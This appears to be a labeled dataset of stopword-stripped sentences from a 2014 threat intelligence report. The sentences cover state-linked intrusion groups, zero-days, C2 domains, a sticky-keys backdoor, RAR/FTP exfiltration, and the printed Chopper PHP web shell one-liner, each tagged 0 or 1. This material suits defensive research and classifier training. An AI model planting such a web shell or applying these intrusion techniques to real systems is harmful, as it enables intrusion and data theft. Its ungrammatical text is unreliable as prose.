+Analysis Win64.exe binary revealed exploits previously unknown vulnerability elevate privileges SYSTEM user create new process access rights run command passed argument	1
+The file 55 kilobytes size contains functions	0
+First exploit gained kernel execution corrupting memory Windows window manager used increased level authority overwrite access token EPROCESS structure user - mode process SYSTEM process	0
+From elevation command passed executable executed elevated privileges	1
+The vulnerability present 32-bit 64-bit architectures Windows Windows XP Windows 7	0
+The code perform steps extremely well written fully reliable	0
+The adversary gone considerable effort minimize chance discovery	0
+The exploit tool deployed absolutely necessary intrusion operations deleted immediately use	1
+A build timestamp Win64.exe binary 3 May 2014 suggests vulnerability actively exploited wild least five months prior discovery	0
+What able characterize exploit earlier versions found indicate constant development privilege - escalation tools	0
+In fact tools found exploits similar vulnerabilities addressed Microsoft patches released earlier 2014	0
+These tools share overall structure new one indicating code used weaponize privilege- escalation exploits different security bugs	0
+These observations suggest HURRICANE PANDA maintains arsenal exploits unpatched privilege - escalation vulnerabilities	0
+two thousand fourteen CrowdStrike Global Threat Intel Report Notable Activity This case underlines necessity tight endpoint monitoring order detect adversary behavior like	0
+Within days discovering use exploit CrowdStrike reported vulnerability proof concept Microsoft subsequently released security bulletin MS14 - 058 well patches affected platforms	0
+CVE-2014 - 1761 - Microsoft Word Remote Code Execution In 2014 CrowdStrike Intelligence spent significant amount time investigating operations leveraged new Microsoft Word exploit CVE-2014 - 1761	0
+The exploit vulnerability bit complex successful allowed remote code execution	0
+Cybercrime adversaries first use exploit wild ; however use soon proliferated Russia- China - based targeted intrusion adversaries	0
+The proliferation exploit CVE-2014 - 1761 across several adversaries unprecedented illustrate possible ways actors connected	0
+In instance cybercrime actors first observed using exploit wild	0
+Several weeks later targeted intrusion adversaries began leveraging operations	0
+The likely explanation targeted intrusion adversaries able rediscover develop exploit code vendor advisory released	0
+Notable Activity This seems likely Microsoft released initial advisory exploit late March targeted activity began early April	0
+However another possible proliferation pathway exploit direct pass cybercrime actor targeted intrusion actor	0
+It also possible individuals involved cybercrime operations also carrying targeted intrusion operations able use exploit purposes	0
+CrowdStrike Intelligence also discovered simple builder program allowed malicious actors automatically build CVE-2014 - 1761 exploit documents	0
+This allows decoy document malicious executable combined malicious CVE-2014 - 1761 document	1
+The Chinese characters show meant use Chinese adversaries could explain easily proliferated among China - based adversaries	0
+PITTY PANDA one actor actively developed capability use exploit	0
+This actor interesting exhibit remarkably disparate level sophistication	0
+On one hand actor proven one early groups able successfully weaponize documents exploit CVE-2014 - 1761 showing notable level competence specific matter	0
+On hand adversary exhibits lack two thousand fourteen CrowdStrike Global Threat Intel Report Notable Activity consistence expertise certain areas	0
+For example - use C2 domains ending .tw certainly sticks target environments unrelated Taiwan	0
+This observed attacks western aerospace defense companies 2014	0
+Recent CrowdStrike analysis PITTY PANDA revealed actor operating longer time frame previously assumed	0
+The activity likely goes back far June 2005 resulting total operational window nine years	0
+PITTY PANDA used least three different RAT families undergone continuous development	0
+PITTY PANDA recently shifted target profile toward aerospace defense sectors introducing new aspect actor 's operations	0
+The overall goal much PITTY PANDA 's past activity appeared intelligence - gathering operations political nature recent operation point toward theft intellectual property	0
+The development adaptation client - side exploits CVE-2014 - 1761 may indicate actor seeking expand operations investing technical capabilities pursue harder targets previously attacked	0
+Event - Driven Operations Malaysia Airlines Incidents Malaysia Airlines suffered two catastrophic incidents 2014	0
+In March one flights ( MH370 ) Kuala Lumpur Beijing mysteriously disappeared less hour takeoff	0
+In July another flights ( MH17 ) Amsterdam Kuala Lumpur shot flying conflict zone Ukraine	0
+These events received large amounts attention press controversy mystery surrounding made incidents ideal targeted intrusion adversaries use operations	0
+Operations leveraging MH370 incident spear phish email began within days accident	0
+The TEMPER PANDA adversary particularly prolific use MH370-related emails deliver malicious documents Notable Activity dropped malware connecting known TEMPER PANDA C2 address www verizon.proxydns.com	1
+Activity LOTUS PANDA adversary actor using Naikon malware also observed	0
+Additionally CrowdStrike identified incident carried adversary believed nexus Pakistan	0
+This attack used malicious zip archive containing file named Malaysia Airline MH370 hijacked Pakistan.scr	0
+It delivered malware commonly known BitterBug used C2 IP address 199.91.173.45	0
+Operations related MH17 crash appeared limited also began within days incident	0
+A number incidents China - based adversaries observed like one identified 22 July 2014 leveraging decoy document concerning black boxes MH17 NetTraveler malware connecting C2 www.gobackto.net	0
+The Russia - based adversary known CrowdStrike FANCY BEAR also piggybacked MH17 disaster targeting victims Sofacy malware dropped alongside document concerning cessation hostilities around crash site	0
+Conflict Ukraine The conflict Ukraine motivation significant amount targeted intrusion operations malicious cyber activity	0
+The conflict leveraged conduct operations targeting entities Ukraine Russia countries interests region	0
+China - based adversaries active targeting around conflict	0
+A significant amount activity Chinese actors related MH17 disaster discussed	0
+While malicious operations related events targeted Ukrainian entities activity China- based actors appeared targeted Russian organizations	0
+Numerous incidents identified leveraging Russian - language lures content concerning security Ukraine one observed incident September using PlugX malware calling chromeupdate	0
+authorizeddns.org googlesupport.proxydns.com	0
+Notable Activity One primary reasons increase Russian targeting China- based adversaries likely ties China Russia recently growing stronger	0
+In May 2014 two countries agreed $ 400 billion deal Russia supply natural gas China	0
+Additionally reached agreements construction bridge countries use port eastern Russia ; also revealed plan set GPS ground stations 's country	0
+This interaction two countries increasingly makes Russia target interest Chinese targeted intrusion operations	0
+In addition China - based activity CrowdStrike Intelligence also identified interesting set targeted activity apparently focused targets within Russia	0
+The actor responsible employs rather complex piece malware uses polymorphic DLLs filenames customized per - deployment basis	0
+The malware dropped alongside wide variety malicious documents containing exploit code either CVE-2012 - 0158 CVE-2014 - 1761	0
+Related decoy documents Russian English language contained content pertaining Russia Ukrainian conflict advertisement sale car German embassy Moscow invitation Russian university conference space technology	0
+The actor abuses legitimate cloud infrastructure C2	0
+Notable Activity High Volume Southeast Asia Targeting Governments Southeast Asia organizations business region popular targets China - based targeted intrusion operations years	0
+China generally interested Southeast Asia proximity desire monitor activity region order retain strategic advantage	0
+However 2014 China specifically motivated carry targeted intrusion operations region tensions Southeast Asian nations primarily Vietnam Philippines due disputes territorial rights South China Sea	0
+The South China Sea long source tension China Southeast Asian nations	0
+The United Nations ( UN ) attempted ease tensions 1982 Convention Law Sea granted countries region rights marine energy resources within certain range coast	0
+This meant give countries region claim vital trade routes vast energy resources believed exist	0
+China disputes UN - granted rights stakes historical claim almost entire South China Sea	0
+Tensions really boiled May 2014 Chinese state - owned energy company placed oil rig HD-981 Vietnamese territorial waters	0
+The rig deployed close Paracel Islands claimed China Vietnam	0
+The presence rig precipitated continuous clashes Chinese Vietnamese vessels violent protests Chinese businesses Vietnam elevated tensions China nations region Philippines	0
+It time May 2014 China - based targeted intrusion activity entities Southeast Asia increased significantly	0
+The uptick likely due Chinese interest monitoring reaction government organizations region	0
+Numerous adversaries ( primarily GOBLIN PANDA VIXEN PANDA LOTUS PANDA PREDATOR PANDA PIRATE PANDA ) numerous malware variants ( PlugX Poison Ivy Mirage Enfal Naikon ) observed used operations	0
+Notable Activity Observed targeting country - may 2014 Observed targeting country - june 2014 CrowdStrike Intelligence observed GOBLIN PANDA VIXEN PANDA adversaries actively targeting Southeast Asia	0
+GOBLIN PANDA activity heavily weighted towards Vietnamese targets	0
+This adversary used multiple malware variants period time switched almost entirely PlugX malware	0
+Based decoy documents used incidents appears Vietnamese government organizations primary target ( although private sector targeting foreign companies observed well ) Notable Activity decoys often Vietnamese government documents	0
+The screenshot example one decoys one related Vietnam 's Fisheries Protection Department	0
+A reference HD-981 oil rig seen first sentence	0
+The C2 domain malware used conjunction document dns.dubkill.com	0
+In regional targeting surrounding events VIXEN PANDA activity observed focusing mostly Philippines particularly area defense	0
+Pictured decoy document incident identified April	0
+The content header marked " Secret " letterhead Philippines Naval Operation Center	0
+The malware used incident Mirage installed using DLL side - loading takes advantage search order operating system goes load DLLs	0
+This particular sample Notable Activity used NVIDIA - related files often seen PlugX side - load Mirage payload	0
+The C2 malware incident todaynews.dns-dns.com	0
+The Southeast Asia activity declined dramatically end August coincided time China removed HD-981 Vietnamese waters	0
+A slight spike occurred October PIRATE PANDA VIXEN PANDA stepped targeting Vietnam Philippines possibly due arms acquisitions Vietnam meant bolster maritime security capabilities	0
+Since time sporadic activity Southeast Asia focus observed nothing sustained level like observed May October	0
+It highly likely tensions increase disputes territory resources South China Sea remain unresolved	0
+DEEP PANDA Think Tank Targeting In July 2014 CrowdStrike publicly reported malicious activity linked DEEP PANDA adversary two U.S.- based think tanks.11 This activity followed typical DEEP PANDA Tactics Techniques Procedures ( TTPs ) Notable Activity time novel technique utilizing PowerShell download MadHatter malware victim machines	0
+Although TTPs typical specific targeting institution provided insight adversaries may tasked operations	0
+Analysis incident revealed mid - June 2014 adversary focused experts Asian Chinese policy affected institution	0
+This targeting consistent objectives likely imposed Chinese intelligence collection time support global intelligence collection surrounding ongoing HD-981 incident	0
+During mid - June DEEP PANDA clearly immediately shifted focus Asia - related issues Middle East - related issues	0
+This shift coincided significant uptick attacks Islamic State Iraq Syria ( ISIS ) particularly attack Baiji oil refinery Iraq	0
+At one institution actor focused target expertise China 's natural resource consumption energy sourcing requirements	0
+Additional targets institution included executive assistant network engineers administrators	0
+The targeting executive assistant would likely provide access information high - level strategy operational information targeting network administrators would provide information useful lateral movement establishing persistence	0
+At second institution targeted individuals extensive careers U.S.	0
+government intelligence community written U.S.	0
+Middle East policy given congressional testimony ISIS issues	0
+The targets instance could provide information potential U.S.	0
+strategy possibly even communications institution U.S.	0
+government entities	0
+The rapid pivot individuals institutions focused Asia issues individuals focused Middle East issues shows quickly adversaries able react new tasking	0
+The targeting cases appear line interests government organizations would desire information strategic options U.S.	0
+might considering respect ISIS	0
+Information kinds institutions would also useful companies business Middle East	0
+Notable Activity World Cup The biggest event year terms media coverage sheer global attention FIFA World Cup played Brazil 12 June 13 July	0
+Events scale usually attract malicious actors leverage purposes deceiving targets credentials theft compromise networks espionage objectives	0
+CrowdStrike covered run - World Cup reporting outlined potential threats event	0
+Chief among hacktivists attacking defacing websites related Cup	0
+Designated adversary GHOST JACKAL detected partaking said actions prior beginning tournament also saw large - scale street protests government	0
+Later Cup CrowdStrike 's warning came fruition websites Cup Brazil 's Federal Police taken down.12 Additionally CrowdStrike observed limited World Cup - related targeted intrusion activity China - based actors LOTUS PANDA	0
+VIXEN PANDA level activity actors high anticipated	0
+Know adversary better protect network	0
+Detect deter defend today 's sophisticated attackers	0
+two thousand fourteen CrowdStrike Global Threat Intel Report Know Adversary Effect Public Reporting Adversary Activity In 2013 Global Threat Report CrowdStrike discussed Russian adversary designated ENERGETIC BEAR	0
+Beginning July 2014 several security vendors disclosed additional information actor	0
+This adversary previously demonstrated basic awareness operational security ( OPSEC )	0
+Unsurprisingly ENERGETIC BEAR quickly abandoned compromised website C2 infrastructure acquired operations	0
+Although infected machines would continue beacon C2 servers tasking would provided	0
+Since public disclosures new builds malware used ENERGETIC BEAR – primarily Havex SYSMain RATs – observed	0
+This toolset seen several evolutionary developments period spanning least five years loss likely cause adversary enter retooling phase	0
+The underlying intelligence requirements driving operations unlikely change however likely ENERGETIC BEAR - emerge new toolset future	0
+In June 2014 CrowdStrike published13 public reporting detailing attribution adversary designated PUTTER PANDA 12th Bureau 3rd General Staff Department People 's Liberation Army also known Unit 61486	0
+This attribution facilitated one PUTTER PANDA operators providing pictures unit 's operational base social media using accounts could associated C2 domains – serious OPSEC mistake	0
+After publication CrowdStrike 's report social media account containing photos unit 's base deleted PUTTER PANDA appears stopped using tools previously identified CrowdStrike	0
+Know Adversary Another significant public disclosure adversary group publication report Unit 61398 ( a.k.a	0
+COMMENT PANDA ) February 2013	0
+While group also initially " went dark " following report 's public release indications actor operation October 2013	0
+The disclosure information regarding ongoing operations hotly contested information security community	0
+Many attribute disclosures marketing self - promoting behavior	0
+While motivations surrounding public disclosures certainly open discussion observations indicate public disclosures date significant impact advanced adversary operations	0
+It becoming apparent priorities levied organizations sponsoring cyber espionage unaffected disclosures	0
+It highly likely groups publicly reported return activities new toolsets already	0
+CrowdStrike 's approach public disclosure balances benefits disrupting operations risk losing visibility adversary actions driving change TTPs	0
+This balance accomplished looking existing publicly available reporting likely reaction adversary	0
+This reviewed terms Intelligence Gain / Loss ( IGL ) ; among things includes potential intelligence value disclosure potential impacts visibility adversary impact ability protect customers ? Forcing adversary retool means cost business gone ; must invest new tools infrastructure potentially training may consequences brazen adversary future	0
+HURRICANE PANDA HURRICANE PANDA advanced China - based adversary actively targeting Internet services engineering aerospace companies	0
+Know Adversary Since February 2014 CrowdStrike Intelligence observed HURRICANE PANDA leverage least two zero - day exploits unique DNS resolution technique tools traditionally used Chinese actors	0
+Once inside victim 's network adversary seeks gain legitimate credentials move laterally establish RDP sessions achieve objectives	1
+Based technical capabilities HURRICANE PANDA currently one advanced Chinese actors tracked CrowdStrike	0
+Zero - days Exploits Web Vulnerabilities As stated CrowdStrike Intelligence observed HURRICANE PANDA leveraging two zero - day exploits indicating adversary - average capability access exploit developers	0
+First February 2014 actor observed using SWC tactics gain initial footholds victim networks via CVE- 2014 - 0322	0
+Successful exploitation campaign led victims install Sakula malware	0
+Much targeting campaign appeared French aerospace sector.14 In October 2014 HURRICANE PANDA used CVE-2014 - 4113 escalate privileges already - compromised 64-bit Windows machines.15 Their exploitation vulnerability marked first time observed wild	0
+In addition zero - day exploits HURRICANE PANDA also used three privilege - escalation exploits another remote code execution exploit	0
+Finally another case HURRICANE PANDA gained initial access victim via SQL injection vulnerability	0
+They used vulnerability upload simple Chopper webshell script gain additional access move laterally corporate network install additional RATs	0
+The RAT Pack HURRICANE PANDA makes use several Remote Access Tools Know Adversary ( RATs )	0
+Over course year CrowdStrike Intelligence observed adversary employing Sakula Gh0st RAT PlugX HiKit	0
+While Gh0st RAT widely available many years RATs exclusively tied China - based actors	0
+This actor also made extensive use Chopper webshell ; provides equivalent functionality RAT adversary control webservers	1
+Chopper exist rather simple form	0
+? php eval($_POST["chopper " ] ) ; ? " chopper " attacker - selected password sorts	0
+This simple one - line script gives attacker access webserver deploy privilege - escalation tools move laterally deploy complex scripts interact databases webserver	1
+While PlugX usage increased significantly past year among China - based actors HURRICANE PANDA 's usage tool notable two reasons	0
+First configuring PlugX attacker given option using four DNS servers choosing	0
+Knowing HURRICANE PANDA discovered unique service offered California - based Internet service provider Hurricane Electric	0
+By abusing Hurricane Electric 's free DNS service actors able resolve popular domains like www.pinterest.com adobe.com github.com	0
+Using legitimate domains presumably would fool incident responders believing communications benign	0
+HURRICANE PANDA leveraged PlugX 's custom DNS feature use free DNS hosting services provided Hurricane Electric resolve domains PlugX C2 nodes instead legitimate IP addresses	0
+Hurricane Electric quickly took action prevent abuse allowed DNS resolution legitimate domains	0
+Know Adversary string	0
+The decoded string contains protocol communicate well IP address port pair	0
+When strings decoded following IP addresses used PlugX C2 servers	1
+Post - Exploitation Exfiltration After HURRICANE PANDA established foothold victim 's network seek legitimate credentials via tools Windows Credential Viewer Windows Credential Editor Mimikatz	1
+Once credentials obtained actor tends use access network instead interacting RAT thus reducing footprint allowing appear legitimate VPN users	0
+If credentials obtained HURRICANE PANDA often rely RDP	1
+First replace sticky keys file ( using sethc.exe hack16 ) copy preferred Chinese version cmd.exe victim machine	0
+Then access victim computer RDP presented login screen IT invoke sticky keys mechanism presented administrative command shell	1
+Furthermore PlugX contains reverse - RDP tunneling capability HURRICANE PANDA employed	0
+Exfiltration HURRICANE PANDA follows simple pattern often performed China - based adversaries	0
+First files interest compressed password protected using RAR	1
+Next stage files convenient location	1
+Finally exfiltrate files network via FTP	1
+Know Adversary Possible Connections AURORA PANDA CrowdStrike Intelligence currently evaluating possible connections HURRICANE PANDA AURORA PANDA	0
+There currently definitive link indicators compromise linked AURORA PANDA discovered networks also compromised HURRICANE PANDA	0
+Other connections include similar toolsets access zero - day exploits possible infrastructure connections	0
+HURRICANE PANDA among capable China - based adversaries run - ins actor treated utmost concern	0
+GOTHIC PANDA GOTHIC PANDA another advanced Chinese adversary CrowdStrike Intelligence tracked throughout 2014	0
+This adversary observed targeting number high - profile victims key sectors including financial technology NGO / international energy	0
+In early May 2014 CrowdStrike observed adversary mounting campaign spear phishing messages used direct targets landing pages would exploit zero - day Use - After- Free vulnerability Internet Explorer	0
+The following brief timeline important events campaign	0
+Know Adversary In addition targeting individuals within targeted organizations phishing messages adversary observed sent mailing lists specialized topics high - performance computing weather metadata software pre - medical programs educational institutions	0
+An observed phishing message show	0
+Victims campaigns infected implant known anti - virus name Pirpi seen use since 2009	0
+Pirpi provides adversary traditional set RAT features allow adversary exfiltrate deploy files along remote shell access compromised system	1
+GOTHIC PANDA considered CrowdStrike Intelligence one advanced adversaries tracked	0
+Over time Pirpi implant improved feature aggressive anti - analysis techniques network communication control servers improved hinder network - based detection	0
+While investigating GOTHIC PANDA CrowdStrike Intelligence identified strong code overlap Pirpi implant Know Adversary defunct malware known anti - virus name Dreammon ( DreamClick )	0
+This malware possesses feature set line adclicker malware rather targeted activity	0
+As adclicker malware common criminal adversaries postulated adversary behind Dreammon behind Pirpi adversary 's initial motives may financially driven	0
+Overview Russian Threat Actors Although Chinese calendar predicted 2014 would Year Horse many respects 2014 Year Bear cyber realm several high - profile Russia - based actors receiving public attention	0
+The reported activity included actors tracked CrowdStrike ENERGETIC BEAR FANCY BEAR VENOMOUS BEAR well sets Sandworm uses Black Energy toolset targeted attacks contrast normal use criminal malware	0
+CrowdStrike also tracks adversaries attributed Russia cryptonyms BERSERK BEAR BOULDER BEAR financial - crime- motivated actor MAGNETIC SPIDER	0
+VENOMOUS BEAR also known Snake Turla Oroborous uses set implants culminates sophisticated Windows - based rootkit leverage encrypted Virtual File System ( VFS ) staging area tools deploy data prepared exfiltration	1
+It also includes implants platforms Linux used operate command - - control infrastructure	0
+External reporting indicates targeting bias toward entities government sector along use zero - day exploits	0
+These TTPs along maturity attacker 's toolset indicate highly sophisticated adversary	0
+FANCY BEAR CrowdStrike 's name adversary also known Sofacy	0
+Although tools used actor complex employed VENOMOUS BEAR share common targeting focus government military entities particular Know Adversary emphasis Russia 's " near abroad " regions Eastern Europe	0
+As well implants Windows Linux mobile operating systems FANCY BEAR employs credential phishing attacks spoofing legitimate sites harvest details users interest	0
+Proactive analysis 2014 revealed another Russian actor encountered public exposure yet appears tasked Russian state interests	0
+BERSERK BEAR conducted operations 2004 present day primarily aimed collecting intelligence also provided capability support offensive operations parallel Russia / Georgia conflict August 2008	0
+ENERGETIC BEAR tracked CrowdStrike since 2012	0
+The adversary initially focused targets energy sector recently branched attempt compromise financial industrial commercial organizations	0
+This corresponded shift primarily using SWC attack vectors targeted email attacks	0
+Analysis ENERGETIC BEAR 's post - exploitation activity revealed use custom tools credential harvesting network enumeration interaction industrial automation equipment	0
+FANCY BEAR In second half 2014 CrowdStrike Intelligence analyzed targeted attack activity particularly interesting Russian actor named FANCY BEAR	0
+The campaigns conducted actor target high - profile military government entities variety countries notably political institutions former Soviet nations well Eastern European countries NATO institutions organizations western countries	0
+Technical indicators resource locales C2 domain registrant information exhibit references Russian - speaking adversary	0
+In addition targeting consistent strategic interests Russian Federation	0
+Know Adversary Targeting high - profile entities requires mature versatile technical means	0
+FANCY BEAR exhibits consistent level technical sophistication respect tools actor characterized thorough preparation attacks required infrastructure	0
+Their main implant called X - Agent sophisticated RAT exhibits modular architecture multi - year development history	1
+As consequence adversary combine necessary implant functionality per - target basis spanning multiple operating systems mobile platforms	0
+A remarkable feature seen well - engineered mature targeted attack malware following If required implant switch carrier protocol command - and- control channel ranging HTTP email removable media	0
+The latter specifically suited target environments direct network connectivity C2 node instead rely periodic use USB removable media bridge air gaps	0
+In addition recent incidents involved heavily obfuscated malware including code flow obfuscation likely another step taken order hinder analysis efforts	0
+All underline clear targeted attack mission	0
+Understand evolving capabilities advanced adversaries affect 2015	0
+Looking Forward Predicting happen 2015 challenge unforeseen events inevitably occur new TTPs adversaries across motivational spectrum continue shape threat environment	0
+Before exploring may coming 2015 brief look back predictions 2014 order	0
+Last year CrowdStrike made number predictions 2014 threat landscape many came fruition	0
+Outlook China - Based Adversaries China well known conducting cyber espionage campaigns focused accessing intelligence intellectual property mergers acquisitions technologies highlighted Five - Year plans	0
+Targeting technologies strategic business information allow domestic companies rapidly make " leap frog " developments benefit favorable bargaining positions thus elevating become global leaders	0
+This behavior expected continue 2015 continued targeting foreign government entities attempt access information related global strategy plans countries	0
+China expected continue leverage espionage means conduct intelligence collection support aspirations push envelope territorial claims	0
+This particularly true South China Sea ( SCS ) conflicts Vietnam Philippines Senkaku / Diaoyu island dispute Japan	0
+China already undertaken substantial construction manmade islands SCS begin projecting power Navy continues grow seek push beyond current boundaries	0
+China aggressively moving forward design implementation aircraft carriers doubt impact regional issue allowing PRC project force intimidate neighbors	0
+Looking Forward Taiwan continue play important role potential conflicts come testing ground malware main focus expanding Chinese territorial claims	0
+The PRC views Taiwan inalienable part China eventually reunited greater good peoples therefore places territorial conflicts	0
+Taiwan 's recent shift towards decidedly less - Beijing - friendly DPP - led government great concern China major factor China uses technology facilitate political maneuverings	0
+Taiwan historically penetrated PRC intelligence services levels makes cyber one first visible indicators PRC intentions regarding Taiwan	0
+China also made significant headway projecting " soft power " abroad via multiple billion - dollar investments particularly sectors communications transportation infrastructure	0
+For years China making inroads Africa provide vast majority continent 's telecommunication systems recently sinister intentions brought light	0
+In December 2014 approximately 77 Chinese nationals found running sophisticated command center house Nairobi Kenya appeared capable targeting main communication systems capital	0
+A building multiple large satellites appears annexed Chinese embassy Paris also recently reported believed connected 3PLA 's 8th Bureau Unit 61046 responsible SIGINT collection western Europe	0
+Image Alleged SIGINT Dishes Chinese Embassy Annex Looking Forward There also significant amount investment poured transportation projects particularly high - speed rail ( HSR ) lines multiple countries	0
+China already planned merge two top train makers HSR juggernaut capable building massive rail lines around world	0
+To end China submitted bids massive rail projects Nigeria nearly ( subsequently canceled ) another project Mexico	0
+China also suggested massive lines Beijing Moscow constructing line Delhi Chennai India	0
+Beijing also remains interested proposals HSRs Britain California already made headway construction Hungary- Serbian HSR connect Belgrade Budapest	0
+In total projects proposed China would give control 40,000 km giving significant control world 's transportation routes	0
+It seems fairly likely given China 's previous use espionage foreign companies ( used gain advantages competitive bidding mergers & acquisitions ) substantial motivation China follow suit coming year looks secure position global leader HSR construction	0
+Joint Plan Action Could Possibly Drive Iranian Cyber Attacks The Iranian Joint Plan Action ( JPOA ) delay ultimate desired path politicians negotiate Comprehensive Plan Action ( CPOA ) preeminent issues global press political circles	0
+The JPOA temporary agreement made Iran intergovernmental negotiating body consisting China France Russian Federation Un ited Kingdom United States Germany	0
+The agreement originally intended six - month period Iranian government would reduce stockpile enriched uranium fuel suspend specific aspects nuclear energy programs exchange UN Security Council relaxing specific sanctions previously imposed Iran	0
+During time suspended nuclear research activities Looking Forward eased sanctions negotiating parties would discuss details permanent agreement known Comprehensive Plan Action ( CPOA )	0
+The JPOA could driver tipping point future cyber attacks Iran western targets	0
+Iran publicly noted understanding negotiations influenced demonstrated historically willing ( capabilities ) conduct cyber operations influence negotiations sees fit	0
+It publicly speculated Iran conducted retaliatory attacks notably Shamoon incident 2012	0
+Recent open - source activities Iranian underground suggest Iran may attempting structure resource possible future cyber operations	0
+There visibility changes regard information surrounding Iranian hackers well forums websites	0
+Popular forums Iranian hackers ISCN Shabgard shut longer publicly accessible	0
+Despite shutdowns likely little change communication occurring affiliated hackers closed communications pathways	0
+The closing forums could anticipation future malicious activity desire decrease public profile individuals Iranian underground	0
+There also clear links Iranian government hacking contests intended identify hackers advanced skills learn advanced methods network intrusion	0
+For example November 2013 JPOA agreement signed Sharif University Technology conducted contest " innovative methods " computer network intrusions defense intrusions	0
+Based contest announcements Iranian government cyber security authorities access students ' submissions contest submissions released public rather kept private access contest submissions	0
+Looking Forward Iranian adversaries ROCKET KITTEN FLYING KITTEN CHARMING KITTEN quite active 2014 targeting western governments companies	0
+The motivation attack targets increase 2015	0
+However process around JPOA CPOA take turn Iran perceives disadvantageous motivation likely greatly increase	0
+Recent revelations indicate ROCKET KITTEN may fact targeted JPOA negotiations using spear phishing may targeted diplomats involved meetings	0
+Cyber Spillover Regional Conflicts Last year 's report included cyber spillover something look 2014 equally important 2015	0
+Increasingly real- world physical conflicts carrying associated cyber components	0
+Sometimes related cyber operations carried entities directly engaged conflict times entities directly involved engage cyber operations attempt support one side	0
+It possible predict possible conflicts 2015 three primary areas keep eye	0
+The conflict may see significant uptick associated activity one centered around ISIS	0
+The Syrian civil war saw quite bit associated cyber operations western targets 2013 many attributed DEADEYE JACKAL adversary ( Syrian Electronic Army )	0
+Since time ISIS terrorist group become significant threat region appears capable bringing resources bear carry malicious cyber attacks	0
+Already early January 2015 group calling CyberCaliphate declaring support ISIS hacked social media presence U.S.	0
+Central Command used spread Islamist propaganda	0
+It likely related groups supporting Islamist cause engage operations support ISIS objectives	0
+Most activity likely nuisance defacements Looking Forward low - level DDOS attacks possible advanced actors could carry targeted even destructive attacks	0
+The South China Sea area continue watch 2015	0
+As discussed tensions area drove great deal targeted intrusion activity China - based adversaries 2014	0
+Tensions subsided toward end 2014 region rich natural resources countries particularly China eager lay claim resources	0
+Because significant possibility conflict flare coming year	0
+One thing could temper possibility conflict oil prices remain low making oil exploration area potentially less lucrative	0
+Ukraine third region keep eye possible cyber spillover 2015	0
+The physical conflict already spilled cyberspace discussed	0
+So long Ukrainian conflict remains unresolved foreign governments continue exert pressure Russia via economic sanctions expect continued Russian targeting governments particularly Europe U.S.	0
+Another related contributing factor Russian cyber operations falling price oil	0
+Russia 's economy deeply dependent oil prices	0
+The precipitous fall price oil end 2014 going 2015 already caused great deal economic turmoil Russia	0
+An extended period low oil prices could result increased malicious cyber activity Russian adversaries foreign governments private sector organizations	0
+The Future PoS Attacks PoS malware experienced great deal success 2014 however upcoming changes may force changes payment- processing systems U.S.	0
+For example several major credit card companies expected institute new policies October 2015 shift liability fraudulent transactions whomever Looking Forward using weakest payment - processing systems	0
+The purpose drive retailers adopt EMV ( Europay MasterCard Visa ) standards entail chip PIN cards use combination traditional PIN number embedded microchip encrypts vital information	0
+This type card offers secure payment card solution consumers	0
+Additionally several alternative solutions Apple Pay Google Wallet started becoming adopted allowing payment via token systems	0
+In theses systems rather card number transmitted one - time token passed consumer 's device retailer	0
+The advantage system event token obtained unauthorized party reused later transactions	0
+Adoption newer payment processes provide consumers secure payment methods make difficult criminals seeking make money systems	0
+There lag time 2015 retailers banks move put improvements place cybercriminals still able exploit current antiquated payment processing systems U.S.	0
+However newer processes place lead decline type PoS attacks seen past year	0
+Despite decline almost certain implementation secure methods lead cybercriminals develop sophisticated means attack payment- processing systems	0
+Destructive Disruptive Attacks Destructive attacks ( carried SILENT CHOLLIMA ) disruptive attacks ( DDOS activity gaming platforms ) garnered headlines end 2014	0
+The high - profile nature attacks necessarily indicate grow popularity 2015 however Looking Forward possible success attacks may encourage groups engage destructive disruptive operations advance interests	0
+As example series disruptive attacks December targeted online gaming platforms	0
+These attacks manifested form DDOS operations carried LizardSquad group briefly discussed	0
+The attacks came two waves first early December Xbox Live PlayStation networks knocked offline short period time	0
+The second wave attacks occurred 25 December 2014 Xbox PlayStation online platforms suffered outages LizardSquad claimed responsibility	0
+CrowdStrike Intelligence also aware DDOS threats gaming platforms including Valve Software appeared targeted DNS amplification DDOS attack similar previous LizardSquad activity	0
+Malicious actors already engaged disruptive campaigns early 2015	0
+Following January terrorist attacks France group Islamist hackers known Fallaga conducted DDOS attacks servers hosting websites French foreign embassies	0
+Soon another Islamist group identifying ISIS took control Twitter YouTube accounts U.S.	0
+Central Command posted number messages threatening U.S.	0
+troops families	0
+Organizations sectors aware prepared destructive disruptive attacks	0
+These operations often motivated specific grievance sometimes clear motivation established	0
+Continuous monitoring publicized threats organization potential areas controversy could motivate malicious activity vital detect prepare types attacks	0
+The question How incorporate intelligence daily defenses prioritize resources based risk business ? Conclusion In course reviewing 2014 many interesting events adversaries innovations selecting examples report incredible challenge	0
+The CrowdStrike Intelligence team spent much time narrowing scope topics covered herein	0
+The adversaries 2014 proved nothing else dynamic persistent innovative	0
+Defenders must inventive diligent decisive efforts defend enterprise attackers	0
+2015 continuation cat - - mouse game played adversary defender	0
+Adversaries across motivational spectrum continue evolve tactics order achieve objectives	0
+Although tactics may evolve network defenders able success adversary long well prepared	0
+Intelligence provide decisive advantage sides good defense predicated informed intelligent defensive team	0
+The incorporation intelligence daily defense enterprise continue paramount products services solution providers need use intelligence stay ahead adversary	0
+At CrowdStrike intelligence powers everything 2015 unfolds organizations using intelligence better prepared detect deter defend adversaries	0
+Crowdstrike Falcon Intelligence CrowdStrike Falcon Intelligence portal provides enterprises strategic customized actionable intelligence	0
+Falcon Intelligence enables organizations prioritize resources determining targeted versus commodity attacks saving time focusing resources critical threats	0
+With unprecedented insight adversary Tactics Techniques Procedures ( TTPs ) multi - source information channels analysts identify pending attacks automatically feed threat intelligence via API SIEM third - party security tools	0
+Access CrowdStrike Falcon Intelligence geared toward levels organization executive needs understand business threat strategic business impact front- line security professional struggling fight adversary 's attack enterprise	0
+CrowdStrike Falcon Intelligence web - based intelligence subscription includes full access variety feature sets including	0
+Let us show CrowdStrike help understand adversary better protect network 2015 Contact sales@crowdstrike.com discuss specific needs	0
+888 - 512 - 8906 www.crowdstrike.com two thousand fourteen CrowdStrike Global Threat Intel Report About CrowdStrike CrowdStrike™ leading provider next- generation endpoint protection threat intelligence services	0
+CrowdStrike Falcon enables customers prevent damage targeted attacks detect attribute advanced malware adversary activity real time effortlessly search endpoints reducing overall incident response time	0
+CrowdStrike customers include largest blue chip companies financial services energy oil & gas telecommunications retail technology sectors along largest sophisticated government agencies worldwide	0
+To learn please visit www.crowdstrike.com	0
+In November 2014 experts G DATA SecurityLabs published article ComRAT Agent BTZ successor	0
+We explained case linked Uroburos rootkit	0
